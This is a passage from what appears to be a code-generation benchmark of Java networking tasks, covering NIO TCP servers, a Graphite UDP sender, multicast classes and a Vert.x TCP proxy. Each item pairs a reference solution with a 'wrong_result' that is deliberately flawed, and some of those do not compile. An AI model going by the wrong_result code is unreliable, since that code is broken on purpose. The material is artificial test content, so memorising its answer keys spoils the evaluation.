    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data packets with checksum verification, and manages resources efficiently.\n\nClass Description: NIOServer - A non-blocking TCP server implementation using Java NIO that handles multiple client connections through a single selector thread.\n\nAttributes:\n- serverChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that manages multiple client connections\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port and begins accepting connections\n  - Input: port (int) - The port number to bind the server to\n  - Output: None (throws Exception if startup fails)\n  \n- stop() -> void - Shuts down the server and releases all resources\n  - Input: None\n  - Output: None (handles exceptions internally)\n  \n- handleAccept(SelectionKey key) -> void - Handles new client connection acceptance\n  - Input: key (SelectionKey) - The selection key representing the accept event\n  - Output: None (throws Exception if connection acceptance fails)\n  \n- handleRead(SelectionKey key) -> void - Handles incoming data from clients with checksum verification\n  - Input: key (SelectionKey) - The selection key representing the read event\n  - Output: None (handles exceptions internally)\n  \n- isFull(ByteBuffer buffer) -> boolean - Helper method to check if a buffer is full\n  - Input: buffer (ByteBuffer) - The buffer to check\n  - Output: boolean - True if buffer is full, false otherwise",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n\n    public void start(int port) throws Exception {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.socket().setReuseAddress(true);\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        \n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        \n        while (selector.isOpen()) {\n            if (selector.select(3000) == 0) {\n                continue;\n            }\n            \n            Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                it.remove();\n                \n                if (!key.isValid()) {\n                    continue;\n                }\n                \n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        SocketChannel socketChannel = ((ServerSocketChannel) key.channel()).accept();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(key.selector(), SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        try {\n            ByteBuffer head = ByteBuffer.allocate(4);\n            while (!isFull(head)) {\n                if (channel.read(head) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            head.flip();\n            int dataSize = head.getInt();\n            \n            ByteBuffer body = ByteBuffer.allocate(dataSize);\n            while (!isFull(body)) {\n                if (channel.read(body) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            \n            ByteBuffer tail = ByteBuffer.allocate(8);\n            while (!isFull(tail)) {\n                if (channel.read(tail) == -1) {\n                    break;\n                }\n            }\n            tail.flip();\n            \n            Checksum checksum = new Adler32();\n            checksum.update(body.array(), 0, dataSize);\n            if (tail.getLong() != checksum.getValue()) {\n                throw new RuntimeException(\"Data corrupted\");\n            }\n            \n            body.flip();\n            // Process packet here\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                channel.close();\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.position() == buffer.capacity();\n    }\n\n    public void stop() {\n        try {\n            if (selector != null) {\n                selector.close();\n            }\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private volatile boolean running = true;\n\n    public void start(int port) throws Exception {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        while (running) {\n            int ready = selector.select();\n            if (ready > 0) {\n                for (SelectionKey key : selector.selectedKeys()) {\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    } else if (key.isReadable()) {\n                        handleRead(key);\n                    }\n                    selector.selectedKeys().clear();\n                }\n            }\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (selector != null) {\n                selector.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        client.configureBlocking(false);\n        client.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        try {\n            SocketChannel client = (SocketChannel) key.channel();\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            int bytesRead = client.read(buffer);\n            if (bytesRead > 0) {\n                buffer.flip();\n                if (isFull(buffer)) {\n                    processPacket(key, buffer);\n                }\n            }\n        } catch (IOException e) {\n            key.cancel();\n            try {\n                ((SocketChannel) key.channel()).close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.remaining() == 0;\n    }\n\n    private void processPacket(SelectionKey key, ByteBuffer buffer) {\n        byte[] data = new byte[buffer.limit() - 1];\n        System.arraycopy(buffer.array(), 0, data, 0, data.length);\n        int computedChecksum = 0;\n        for (byte b : data) {\n            computedChecksum += b & 0xFF;\n        }\n        computedChecksum %= 256;\n        byte receivedChecksum = buffer.get(buffer.limit() - 1);\n        if (computedChecksum != receivedChecksum) {\n            try {\n                ((SocketChannel) key.channel()).close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Received valid data: \" + new String(data));\n        }\n    }\n}"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking TCP server using Java NIO (New I/O) to handle multiple client connections efficiently. The server should accept incoming connections, assign them to processors in a round-robin fashion, and manage connection lifecycle.\n\nClass Description: NIOAcceptor is a thread-based TCP server that uses Java NIO's Selector pattern to handle multiple client connections asynchronously. It creates a ServerSocketChannel, binds it to a specified port, and processes incoming connections by distributing them among available NIOProcessor instances.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\nselector: [Selector] - The NIO selector used to monitor connection events\nserverChannel: [ServerSocketChannel] - The server socket channel that accepts client connections\nfactory: [FrontendConnectionFactory] - Factory for creating FrontendConnection objects\nprocessors: [NIOProcessor[]] - Array of processors for handling client connections\nnextProcessor: [int] - Index of the next processor to be used (round-robin assignment)\nacceptCount: [long] - Counter for accepted connections\n\nMethods:\nrun: [run()] -> [void] - Main thread loop that continuously checks for incoming connections using the selector\naccept: [accept()] -> [void] - Accepts a new client connection, configures it as non-blocking, and assigns it to a processor\nnextProcessor: [nextProcessor()] -> [NIOProcessor] - Returns the next available processor in round-robin fashion\ncloseChannel: [closeChannel(SocketChannel)] -> [void] - Closes the specified socket channel safely\n\nNested Class:\nAcceptIdGenerator: [static class] - Generates unique IDs for accepted connections with thread-safe increment operation\n  - acceptId: [long] - Current ID value\n  - lock: [Object] - Synchronization object\n  - getId: [getId()] -> [long] - Returns and increments the connection ID safely",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOAcceptor extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOAcceptor.class);\n    private static final AcceptIdGenerator ID_GENERATOR = new AcceptIdGenerator();\n\n    private final int port;\n    private final Selector selector;\n    private final ServerSocketChannel serverChannel;\n    private final FrontendConnectionFactory factory;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long acceptCount;\n\n    public NIOAcceptor(String name, int port, FrontendConnectionFactory factory) throws IOException {\n        super.setName(name);\n        this.port = port;\n        this.selector = Selector.open();\n        this.serverChannel = ServerSocketChannel.open();\n        this.serverChannel.socket().bind(new InetSocketAddress(port));\n        this.serverChannel.configureBlocking(false);\n        this.serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        this.factory = factory;\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++acceptCount;\n            try {\n                selector.select(1000L);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        if (key.isValid() && key.isAcceptable()) {\n                            accept();\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(getName(), e);\n            }\n        }\n    }\n\n    private void accept() {\n        SocketChannel channel = null;\n        try {\n            channel = serverChannel.accept();\n            channel.configureBlocking(false);\n            FrontendConnection c = factory.make(channel);\n            c.setAccepted(true);\n            c.setId(ID_GENERATOR.getId());\n            NIOProcessor processor = nextProcessor();\n            c.setProcessor(processor);\n            processor.postRegister(c);\n        } catch (Throwable e) {\n            closeChannel(channel);\n            LOGGER.warn(getName(), e);\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static void closeChannel(SocketChannel channel) {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private static class AcceptIdGenerator {\n        private static final long MAX_VALUE = 0xffffffffL;\n        private long acceptId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (acceptId >= MAX_VALUE) {\n                    acceptId = 0L;\n                }\n                return ++acceptId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class NIOAcceptor {\n    private final int port;\n    private final Selector selector;\n    private final ServerSocketChannel serverChannel;\n    private final FrontendConnectionFactory factory;\n    private final NIOProcessor[] processors;\n    private int nextProcessor;\n    private long acceptCount;\n\n    public NIOAcceptor(int port, FrontendConnectionFactory factory, NIOProcessor[] processors) {\n        this.port = port;\n        this.factory = factory;\n        this.processors = processors;\n        try {\n            serverChannel = ServerSocketChannel.open();\n            serverChannel.socket().bind(new InetSocketAddress(port));\n            serverChannel.configureBlocking(false);\n            selector = Selector.open();\n            serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                selector.select();\n                Set<SelectionKey> keys = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = keys.iterator();\n                while (keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    keyIterator.remove();\n                    if (key.isAcceptable()) {\n                        accept();\n                    } else if (key.isReadable()) {\n                        // Handle readable events\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void accept() throws IOException {\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            FrontendConnection connection = factory.createConnection(clientChannel);\n            NIOProcessor processor = nextProcessor();\n            processor.process(connection);\n            acceptCount++;\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        NIOProcessor processor = processors[nextProcessor];\n        nextProcessor = (nextProcessor + 1) % processors.length;\n        return processor;\n    }\n\n    private void closeChannel(SocketChannel channel) {\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static class AcceptIdGenerator {\n        private static final Object lock = new Object();\n        private static long acceptId = 0;\n\n        public static long getId() {\n            synchronized (lock) {\n                return acceptId++;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 444,
    "Instruction": "Task Description: Create a Java class that implements UDP-based communication for sending metrics to a Graphite server using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The GraphiteUDP class provides functionality to connect to a Graphite server via UDP, send metric data in the correct format, and handle connection management. It implements non-blocking UDP communication using Java NIO's DatagramChannel and includes error tracking and resource cleanup.\n\nAttributes:\n- hostname: [String] - The hostname of the Graphite server\n- port: [int] - The port number of the Graphite server\n- address: [InetSocketAddress] - The resolved socket address of the Graphite server\n- datagramChannel: [DatagramChannel] - The NIO channel used for UDP communication\n- failures: [int] - Counter for tracking failed send attempts\n\nMethods:\n- connect(): [void] -> [void] - Establishes a connection to the Graphite server by opening a DatagramChannel\n- isConnected(): [void] -> [boolean] - Checks if the connection to the Graphite server is active\n- send(): [String name, String value, long timestamp] -> [void] - Formats and sends a metric to the Graphite server\n- getFailures(): [void] -> [int] - Returns the count of failed send attempts\n- flush(): [void] -> [void] - Placeholder method (no action needed for UDP)\n- close(): [void] -> [void] - Closes the DatagramChannel and cleans up resources\n- sanitize(): [String s] -> [String] - Sanitizes metric names and values (delegates to GraphiteSanitize)\n- getDatagramChannel(): [void] -> [DatagramChannel] - Returns the current DatagramChannel instance\n- setDatagramChannel(): [DatagramChannel datagramChannel] -> [void] - Sets the DatagramChannel instance\n- getAddress(): [void] -> [InetSocketAddress] - Returns the current target address\n- setAddress(): [InetSocketAddress address] -> [void] - Sets the target address",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\npublic class GraphiteUDP implements GraphiteSender {\n\n    private final String hostname;\n    private final int port;\n    private InetSocketAddress address;\n\n    private DatagramChannel datagramChannel = null;\n    private int failures;\n\n    public GraphiteUDP(String hostname, int port) {\n        this.hostname = hostname;\n        this.port = port;\n        this.address = null;\n    }\n\n    public GraphiteUDP(InetSocketAddress address) {\n        this.hostname = null;\n        this.port = -1;\n        this.address = address;\n    }\n\n    @Override\n    public void connect() throws IllegalStateException, IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n\n        if (hostname != null) {\n            address = new InetSocketAddress(InetAddress.getByName(hostname), port);\n        }\n\n        datagramChannel = DatagramChannel.open();\n    }\n\n    @Override\n    public boolean isConnected() {\n        return datagramChannel != null && !datagramChannel.socket().isClosed();\n    }\n\n    @Override\n    public void send(String name, String value, long timestamp) throws IOException {\n        try {\n            String str = sanitize(name) + ' ' + sanitize(value) + ' ' + Long.toString(timestamp) + '\\n';\n            ByteBuffer byteBuffer = ByteBuffer.wrap(str.getBytes(UTF_8));\n            datagramChannel.send(byteBuffer, address);\n            this.failures = 0;\n        } catch (IOException e) {\n            failures++;\n            throw e;\n        }\n    }\n\n    @Override\n    public int getFailures() {\n        return failures;\n    }\n\n    @Override\n    public void flush() throws IOException {\n        // Nothing to do\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (datagramChannel != null) {\n            try {\n                datagramChannel.close();\n            } finally {\n                datagramChannel = null;\n            }\n        }\n    }\n\n    protected String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    InetSocketAddress getAddress() {\n        return address;\n    }\n\n    void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "public class GraphiteUDP {\n    private String hostname;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel datagramChannel;\n    private int failures;\n    private boolean connected;\n\n    public void connect() {\n        try {\n            datagramChannel = DatagramChannel.open();\n            datagramChannel.configureBlocking(false);\n            InetAddress inetAddress = InetAddress.getByName(hostname);\n            address = new InetSocketAddress(inetAddress, port);\n            boolean connected = datagramChannel.connect(address);\n            this.connected = connected;\n        } catch (Exception e) {\n            this.connected = false;\n        }\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public void send(String name, String value, long timestamp) {\n        if (!isConnected()) {\n            failures++;\n            return;\n        }\n        String sanitizedName = sanitize(name);\n        String sanitizedValue = sanitize(value);\n        String formatted = sanitizedName + \" \" + timestamp + \" \" + sanitizedValue;\n        ByteBuffer buffer = ByteBuffer.wrap(formatted.getBytes());\n        try {\n            datagramChannel.send(buffer, address);\n        } catch (IOException e) {\n            failures++;\n        }\n    }\n\n    public int getFailures() {\n        return failures;\n    }\n\n    public void flush() {\n        // No action needed for UDP\n    }\n\n    public void close() {\n        try {\n            if (datagramChannel != null) {\n                datagramChannel.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    public void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    public InetSocketAddress getAddress() {\n        return address;\n    }\n\n    public void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n\n    public String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n}"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Create a Java class that implements a multicast sender using UDP with Java NIO's DatagramChannel for non-blocking communication. The class should support both IPv4 and IPv6 protocols and allow sending messages to a multicast group.\n\nClass Description: The MulticastSender class is responsible for sending messages to a multicast group using UDP. It utilizes Java NIO's DatagramChannel for efficient non-blocking communication and supports configuration of TTL (Time To Live) for multicast packets. The class handles both IPv4 and IPv6 protocols automatically based on the system's IP stack type.\n\nAttributes:\n- sock: [DatagramSocket] - The underlying DatagramSocket used for communication\n- mcast_addr: [InetAddress] - The multicast address to send messages to\n- bind_addr: [InetAddress] - The local address to bind to\n- mcast_port: [int] - The multicast port number\n- local_port: [int] - The local port number to bind to\n- ttl: [int] - Time To Live for multicast packets\n- prot_family: [ProtocolFamily] - The protocol family (INET or INET6) determined by the system's IP stack\n\nMethods:\n- MulticastSender: [Constructor](InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) -> [void] - Initializes the multicast sender with binding address, ports, multicast address, and TTL\n- start: [start]() -> [void] - Starts the sender, binds to the specified address and port, and begins reading input from stdin to send as multicast messages\n- bindToInterfaces: [bindToInterfaces](List<NetworkInterface> interfaces, MulticastSocket s) -> [void] - Helper method to bind multicast socket to multiple network interfaces (currently unused in main flow)",
    "Canonical_solution": "import org.jgroups.util.StackType;\nimport org.jgroups.util.Util;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.channels.DatagramChannel;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class MulticastSender {\n    protected DatagramSocket sock;\n    protected InetAddress mcast_addr;\n    protected InetAddress bind_addr;\n    protected int mcast_port;\n    protected final int local_port;\n    protected final int ttl;\n    protected static final ProtocolFamily prot_family;\n\n    static {\n        StackType ip_version = Util.getIpStackType();\n        prot_family = ip_version == StackType.IPv6 ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n    }\n\n    public void start() throws Exception {\n        DatagramChannel channel = null;\n        try {\n            channel = DatagramChannel.open(prot_family)\n                    .setOption(StandardSocketOptions.IP_MULTICAST_TTL, ttl)\n                    .bind(new InetSocketAddress(bind_addr, local_port));\n            sock = channel.socket();\n\n            DataInputStream in = new DataInputStream(System.in);\n            while(true) {\n                System.out.print(\"> \");\n                try {\n                    String line = Util.readLine(in);\n                    byte[] buf = line.getBytes();\n                    DatagramPacket packet = new DatagramPacket(buf, buf.length, mcast_addr, mcast_port);\n                    sock.send(packet);\n                }\n                catch(Throwable t) {\n                    t.printStackTrace();\n                }\n            }\n        }\n        finally {\n            if(channel != null)\n                channel.close();\n        }\n    }\n\n    protected void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n        SocketAddress tmp_mcast_addr = new InetSocketAddress(mcast_addr, mcast_port);\n        for(NetworkInterface intf: interfaces) {\n            try {\n                s.joinGroup(tmp_mcast_addr, intf);\n            }\n            catch(IOException e) {\n                System.err.printf(\"failed joining interface %s: %s\\n\", intf, e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "import java.net.*;\nimport java.io.*;\n\npublic class MulticastSender {\n    private DatagramSocket sock;\n    private InetAddress mcast_addr;\n    private InetAddress bind_addr;\n    private int mcast_port;\n    private int local_port;\n    private int ttl;\n    private ProtocolFamily prot_family;\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n\n        try {\n            InetAddress inet6 = InetAddress.getByName(\"::1\");\n            prot_family = ProtocolFamily.INET6;\n        } catch (Exception e) {\n            prot_family = ProtocolFamily.INET;\n        }\n\n        try {\n            sock = new DatagramSocket(local_port, bind_addr);\n            sock.setReuseAddress(true);\n            sock.setSoTimeout(0);\n            sock.setSoLinger(0);\n            sock.setTrafficClass(0);\n            sock.setSendBufferSize(65535);\n            sock.setReceiveBufferSize(65535);\n\n            if (prot_family == ProtocolFamily.INET) {\n                sock.setTimeToLive(ttl);\n            }\n        } catch (SocketException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        try {\n            sock.bind(new InetSocketAddress(bind_addr, local_port));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        try {\n            if (prot_family == ProtocolFamily.INET) {\n                MulticastSocket ms = new MulticastSocket(mcast_port);\n                ms.joinGroup(mcast_addr);\n                ms.setTtl(ttl);\n                ms.close();\n            } else {\n                DatagramChannel channel = DatagramChannel.open(ProtocolFamily.INET6);\n                channel.configureBlocking(false);\n                channel.bind(new InetSocketAddress(bind_addr, local_port));\n                channel.socket().setTimeToLive(ttl);\n                channel.socket().setReuseAddress(true);\n                channel.socket().setSoTimeout(0);\n                channel.socket().setSoLinger(0);\n                channel.socket().setTrafficClass(0);\n                channel.socket().setSendBufferSize(65535);\n                channel.socket().setReceiveBufferSize(65535);\n                channel.join(new InetSocketAddress(mcast_addr, mcast_port));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        new Thread(() -> {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    byte[] data = line.getBytes();\n                    DatagramPacket packet = new DatagramPacket(data, data.length, mcast_addr, mcast_port);\n                    sock.send(packet);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n        // Not used in main flow\n    }\n}"
  },
  {
    "Task_id": 448,
    "Instruction": "Task Description: Implement a Java class for multicast UDP communication using Java NIO's DatagramChannel for both sending and receiving messages in a non-blocking manner.\n\nClass Description: The MulticastUDP class provides functionality for joining a multicast group, sending messages to specified targets, receiving messages from the group, and closing the communication channel. It utilizes Java NIO's non-blocking capabilities for efficient UDP communication.\n\nAttributes:\n- channel: DatagramChannel - The NIO channel used for UDP communication  \n- group: InetAddress - The multicast group address  \n- port: int - The port number for multicast communication  \n\nMethods:\n- MulticastUDP(String host, int port) -> void - Constructor that initializes the multicast group address and port, and opens a DatagramChannel  \n- joinGroup() -> void - Binds the channel to the specified port and joins the multicast group  \n- receive() -> String - Receives a message from the multicast group and returns it as a String  \n- send(String message, String targetHost, int targetPort) -> void - Sends a message to a specified target host and port  \n- close() -> void - Closes the DatagramChannel to release resources",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic final class MulticastUDP {\n\n    private DatagramChannel channel;\n    private InetAddress group;\n    private int port;\n\n    public MulticastUDP(String host, int port) throws Exception {\n        this.group = InetAddress.getByName(host);\n        this.port = port;\n        this.channel = DatagramChannel.open(StandardProtocolFamily.INET);\n    }\n\n    public void joinGroup() throws Exception {\n        channel.bind(new InetSocketAddress(port));\n        channel.join(group, Utils.getLocalNetworkInterface());\n    }\n\n    public String receive() throws Exception {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        SocketAddress sender = channel.receive(buffer);\n        buffer.flip();\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n        return new String(data);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        channel.configureBlocking(true);\n        InetSocketAddress sender = new InetSocketAddress(targetHost, targetPort);\n        channel.send(ByteBuffer.wrap(message.getBytes()), sender);\n    }\n\n    public void close() throws Exception {\n        channel.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "public class MulticastUDP {\n    private DatagramChannel channel;\n    private InetAddress group;\n    private int port;\n\n    public MulticastUDP(String host, int port) throws Exception {\n        this.group = InetAddress.getByName(host);\n        this.port = port;\n        this.channel = DatagramChannel.open();\n        this.channel.configureBlocking(false);\n    }\n\n    public void joinGroup() throws IOException {\n        channel.bind(new InetSocketAddress(port));\n        channel.join(group);\n    }\n\n    public String receive() throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        while (true) {\n            int bytesRead = channel.read(buffer);\n            if (bytesRead > 0) {\n                buffer.flip();\n                String message = new String(buffer.array(), 0, bytesRead);\n                buffer.clear();\n                return message;\n            } else if (bytesRead == -1) {\n                throw new IOException(\"No data received\");\n            }\n        }\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws IOException {\n        InetAddress target = InetAddress.getByName(targetHost);\n        ByteBuffer buffer = ByteBuffer.wrap(message.getBytes());\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.remaining(), target, targetPort);\n        channel.send(packet);\n    }\n\n    public void close() throws IOException {\n        channel.close();\n    }\n}"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a TCP proxy server using Vert.x that forwards incoming connections to a remote server after writing a custom header.\n\nClass Description: The HAProxy class acts as a TCP proxy server that listens for incoming connections, establishes connections to a remote server, writes a specified header to the remote connection, and then pipes data bidirectionally between the client and server.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and error messages\n- HOST: String - The host address where the proxy server will listen (default: \"localhost\")\n- PORT: int - The port number where the proxy server will listen (default: 11080)\n- remoteAddress: SocketAddress - The address of the remote server to forward connections to\n- header: Buffer - The header data to write to the remote connection\n- server: NetServer - The Vert.x TCP server instance\n- client: NetClient - The Vert.x TCP client instance for connecting to remote server\n- connectionRemoteAddress: SocketAddress - Stores the remote address of the established connection\n- connectionLocalAddress: SocketAddress - Stores the local address of the established connection\n\nMethods:\n- HAProxy(SocketAddress remoteAddress, Buffer header) -> HAProxy - Constructor that initializes the proxy with remote server address and header data\n- start(Vertx vertx) -> HAProxy - Starts the proxy server, configures connection handling, and returns the instance (throws Exception if startup fails)\n- stop() -> void - Stops the proxy server and cleans up resources\n- getConnectionRemoteAddress() -> SocketAddress - Returns the remote address of the established connection\n- getConnectionLocalAddress() -> SocketAddress - Returns the local address of the established connection",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.internal.logging.Logger;\nimport io.vertx.core.internal.logging.LoggerFactory;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetClient;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.net.SocketAddress;\n\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic class HAProxy {\n\n    private static final Logger log = LoggerFactory.getLogger(HAProxy.class);\n    private static final String HOST = \"localhost\";\n    private static final int PORT = 11080;\n    private final SocketAddress remoteAddress;\n    private final Buffer header;\n    private NetServer server;\n    private NetClient client;\n    private SocketAddress connectionRemoteAddress;\n    private SocketAddress connectionLocalAddress;\n\n    public HAProxy(SocketAddress remoteAddress, Buffer header) {\n        this.remoteAddress = remoteAddress;\n        this.header = header;\n    }\n\n    public HAProxy start(Vertx vertx) throws Exception {\n        NetServerOptions options = new NetServerOptions();\n        options.setHost(HOST).setPort(PORT);\n        server = vertx.createNetServer(options);\n        client = vertx.createNetClient();\n\n        server.connectHandler(socket -> {\n            socket.pause();\n            client.connect(remoteAddress).onComplete(result -> {\n                if (result.succeeded()) {\n                    log.debug(\"connected, writing header\");\n                    NetSocket clientSocket = result.result();\n                    connectionRemoteAddress = clientSocket.remoteAddress();\n                    connectionLocalAddress = clientSocket.localAddress();\n                    clientSocket.write(header).onSuccess(u -> {\n                        log.debug(\"starting pump\");\n                        socket.closeHandler(v -> clientSocket.close());\n                        clientSocket.closeHandler(v -> socket.close());\n                        socket.pipeTo(clientSocket);\n                        clientSocket.pipeTo(socket);\n                        socket.resume();\n                    }).onFailure(u -> {\n                        log.error(\"exception writing header\", result.cause());\n                        socket.close();\n                    });\n                } else {\n                    log.error(\"exception\", result.cause());\n                    socket.close();\n                